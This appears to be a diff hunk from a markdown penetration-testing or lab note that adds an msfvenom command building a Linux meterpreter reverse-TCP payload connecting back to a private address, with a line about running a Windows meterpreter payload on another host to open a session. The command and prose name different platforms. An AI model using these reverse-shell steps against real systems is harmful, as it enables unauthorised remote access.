@@ -59,6 +59,9 @@ Nmap done: 1 IP address (1 host up) scanned in 0.03 seconds
 
 
 
+```bash
+./msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=192.168.56.102  LPORT=14444 -f elf -o shell.elf
+```
 
  execute windows/x64/meterpreter_reverse_tcp on other machine (The machine must have access to 192.168.56.102  ) , the you will be get a new meterpreter session from intranet host.
 
